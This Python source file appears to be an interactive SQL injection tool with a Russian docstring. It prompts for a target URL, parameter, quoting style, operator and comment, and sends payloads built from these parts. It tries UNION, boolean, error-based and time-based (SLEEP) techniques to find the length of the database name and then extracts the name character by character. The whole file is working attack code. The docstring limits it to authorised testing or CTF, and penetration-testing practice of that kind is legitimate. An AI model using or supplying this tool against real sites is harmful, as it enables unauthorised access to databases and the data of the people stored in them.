"""
=============================================================================
 perebor_name_bd_universal_metod_s_knopkoy.py — универсальный SQLi + конструктор
=============================================================================

ЗАЧЕМ:
    Расширенная версия universal_metod с ГИБКОЙ настройкой запроса под
    нестандартные формы. Помимо авто-выбора метода (union/boolean/error/time)
    и извлечения имени БД, позволяет задать:
      • тип кавычки (none / single ' / double ");
      • оператор (OR, AND, ||, && или пусто);
      • комментарий (-- -, --+-, #);
      • имя submit-КНОПКИ формы (многие формы не срабатывают без неё);
      • метод детекта успеха: 'text' (маркер) или 'count' (число вхождений).
    build_payload() собирает нагрузку из этих кирпичиков.

ГДЕ ПРИМЕНИМО:
    Реальные формы, где важны кавычки/оператор/кнопка, а признак успеха — не
    просто текст, а, например, число строк в ответе (detection='count').

ЗАПУСК:
    python3 perebor_name_bd_universal_metod_s_knopkoy.py
    → пошагово ответить на вопросы мастера.

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - Есть [DEBUG]-печать каждого запроса — удобно при отладке, шумно в бою.
    - Только POST. Для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import time
import string
import sys

def get_user_input():
    url = input("Введите URL цели (например, http://172.23.213.105/index.php): ").strip()
    param = input("Введите имя параметра (например, id или name): ").strip()
    
    use_button = input("Нужно ли нажимать кнопку? (y/n): ").strip().lower() == 'y'
    button_name = ""
    if use_button:
        button_name = input("Введите имя кнопки (например, submit): ").strip()
    
    quote_type = input("Тип кавычки (none/single/double): ").strip().lower()
    operator = input("Оператор (например, OR, AND, ||, &&, или пусто): ").strip()
    comment = input("Комментарий (например, -- - , --+- , #): ").strip()
    
    detection_method = input("Метод определения успеха (text/count): ").strip().lower()
    success_marker = ""
    count_marker = ""
    expected_count = 0
    
    if detection_method == 'text':
        success_marker = input("Введите строку-индикатор успеха: ").strip()
    elif detection_method == 'count':
        count_marker = input("Введите строку для подсчёта (например, '<pre>ID:'): ").strip()
        expected_count = int(input("Ожидаемое количество при успехе: "))
    
    sleep_time = 5
    charset = input(f"Введите набор символов (по умолчанию: {string.ascii_letters + string.digits + '_@.-'}): ").strip()
    charset = charset or (string.ascii_letters + string.digits + "_@.-")
    
    return {
        'url': url,
        'param': param,
        'use_button': use_button,
        'button_name': button_name,
        'quote_type': quote_type,
        'operator': operator,
        'comment': comment,
        'detection_method': detection_method,
        'success_marker': success_marker,
        'count_marker': count_marker,
        'expected_count': expected_count,
        'sleep_time': sleep_time,
        'charset': charset
    }

def send_request(config, payload):
    data = {config['param']: payload}
    if config['use_button']:
        data[config['button_name']] = "Send"
    
    print(f"\n[DEBUG] Отправка запроса: {data}")
    try:
        response = requests.post(config['url'], data=data)
        print(f"[DEBUG] Статус код: {response.status_code}")
        return response
    except Exception as e:
        print(f"[ERROR] Ошибка при отправке запроса: {e}")
        return None

def is_successful(config, response):
    if response is None:
        return False
        
    if config['detection_method'] == 'text':
        result = config['success_marker'] in response.text
        print(f"[DEBUG] Поиск текста '{config['success_marker']}': {result}")
        return result
        
    elif config['detection_method'] == 'count':
        count = response.text.count(config['count_marker'])
        print(f"[DEBUG] Найдено вхождений '{config['count_marker']}': {count} (ожидалось: {config['expected_count']})")
        return count == config['expected_count']
    
    return False

def build_payload(config, base_value, condition=None):
    quotes = {
        'single': "'",
        'double': '"',
        'none': ''
    }
    quote_char = quotes.get(config['quote_type'], '')
    
    parts = [str(base_value) + quote_char]
    
    if config['operator']:
        parts.append(config['operator'])
    
    if condition:
        parts.append(condition)
    
    if config['comment']:
        parts.append(config['comment'])
    
    return " ".join(parts)

def check_length_union(config):
    print("[*] Пробуем UNION-метод...")
    for length in range(1, 31):
        condition = f"UNION SELECT NULL, IF(LENGTH(database())={length}, 'match', 'miss')"
        payload = build_payload(config, 1, condition)
        r = send_request(config, payload)
        if r and "match" in r.text:
            return length
    return 0

def check_length_boolean(config):
    print("[*] Пробуем Boolean-метод...")
    for length in range(1, 31):
        condition = f"LENGTH(database())={length}"
        payload = build_payload(config, 1, condition)
        r = send_request(config, payload)
        if r and is_successful(config, r):
            return length
    return 0

def check_length_error(config):
    print("[*] Пробуем Error-based метод...")
    for length in range(1, 31):
        condition = (
            f"AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT LENGTH(database())), "
            f"FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS temp)"
        )
        payload = build_payload(config, 1, condition)
        r = send_request(config, payload)
        if r and "Duplicate entry" in r.text:
            return length
    return 0

def check_length_time(config):
    print("[*] Пробуем Time-based метод...")
    for length in range(1, 31):
        condition = f"AND IF(LENGTH(database())={length}, SLEEP({config['sleep_time']}), 0)"
        payload = build_payload(config, 1, condition)
        start = time.time()
        send_request(config, payload)
        elapsed = time.time() - start
        if elapsed >= config['sleep_time']:
            return length
    return 0

def extract_db_name(config, length, method_used):
    db_name = ""
    print("[+] Начинаем перебор имени базы данных...\n")
    
    for pos in range(1, length + 1):
        for char in config['charset']:
            char_code = ord(char)
            
            if method_used == "union":
                condition = f"UNION SELECT NULL, IF(SUBSTRING(database(),{pos},1)='{char}', 'match', 'miss')"
            elif method_used == "boolean":
                condition = f"SUBSTRING(database(),{pos},1)='{char}'"
            elif method_used == "error":
                condition = (
                    f"AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT SUBSTRING(database(),{pos},1)), "
                    f"FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS temp)"
                )
            elif method_used == "time":
                condition = f"AND IF(SUBSTRING(database(),{pos},1)='{char}', SLEEP({config['sleep_time']}), 0)"
            else:
                raise ValueError("Неизвестный метод")
            
            payload = build_payload(config, 1, condition)
            
            if method_used == "time":
                start = time.time()
                send_request(config, payload)
                elapsed = time.time() - start
                if elapsed >= config['sleep_time']:
                    db_name += char
                    print(f"[{pos}] Символ найден: {char} → {db_name}")
                    break
            else:
                r = send_request(config, payload)
                if r:
                    if method_used == "union" and "match" in r.text:
                        db_name += char
                        print(f"[{pos}] Символ найден: {char} → {db_name}")
                        break
                    elif method_used in ["boolean", "error"] and is_successful(config, r):
                        db_name += char
                        print(f"[{pos}] Символ найден: {char} → {db_name}")
                        break
    
    return db_name

def main():
    config = get_user_input()
    methods = ["union", "boolean", "error", "time"]
    length = 0
    method_used = None

    print("\n[+] Определение длины имени базы данных...\n")
    
    for method in methods:
        try:
            if method == "union":
                length = check_length_union(config)
            elif method == "boolean":
                length = check_length_boolean(config)
            elif method == "error":
                length = check_length_error(config)
            elif method == "time":
                length = check_length_time(config)
        except Exception as e:
            print(f"[-] Ошибка при проверке методом {method}: {e}")
            length = 0
        
        if length > 0:
            method_used = method
            print(f"[+] Длина имени БД определена: {length} (метод: {method})\n")
            break
        else:
            print(f"[-] Метод {method} не сработал.")
    
    if length == 0:
        print("[-] Не удалось определить длину имени базы данных ни одним из методов.")
        sys.exit(1)
    
    db_name = extract_db_name(config, length, method_used)
    print(f"\n[+] Имя базы данных: {db_name}")

if __name__ == "__main__":
    main()
